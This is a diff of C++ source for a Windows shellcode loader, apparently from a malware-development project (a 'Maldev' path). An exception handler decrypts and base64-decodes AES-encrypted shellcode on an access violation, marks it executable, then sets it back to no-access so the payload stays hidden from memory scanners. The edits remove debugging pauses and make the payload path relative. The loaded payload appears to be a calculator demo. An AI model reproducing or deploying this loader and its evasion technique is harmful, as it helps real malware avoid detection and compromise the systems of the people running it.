@@ -83,11 +83,11 @@ LONG WINAPI handler(EXCEPTION_POINTERS* ExceptionInfo) {
             printf("\n[!] Access violation at %p\n", faultAddr);
             // Decrypt & decode
             VirtualProtect(exec_mem, current_len, PAGE_READWRITE, &old);
-            getchar();
+
             printf("[*] Decrypting & decoding shellcode...\n");
             aes_decrypt((unsigned char*)exec_mem, current_len);
             base64_decode((unsigned char*)exec_mem, &current_len);
-            getchar();
+
             VirtualProtect(exec_mem, current_len, PAGE_EXECUTE_READ, &old);
             return EXCEPTION_CONTINUE_EXECUTION;
         }
@@ -98,7 +98,7 @@ LONG WINAPI handler(EXCEPTION_POINTERS* ExceptionInfo) {
 int main() {
     // Load original encrypted+base64 file
     ifstream infile;
-    infile.open(R"(D:\Maldev\shellcodes\aes_b64_calc1.bin)", ios::in | ios::binary);
+    infile.open(R"(..\..\aes_b64_calc.bin)", ios::in | ios::binary);
     if (!infile.is_open()) { printf("Failed to open file.\n"); return 1; }
     infile.seekg(0, ios::end);
     SIZE_T fileSize = infile.tellg();
@@ -139,7 +139,7 @@ int main() {
         // Reprotect shellcode with PAGE_NOACCESS
         printf("[*] Changing protection to PAGE_NOACCESS!\n");
         VirtualProtect(exec_mem, current_len, PAGE_NOACCESS, &old);
-        getchar();
+        Sleep(3000);
     }
 
     VirtualFree(exec_mem, 0, MEM_RELEASE);
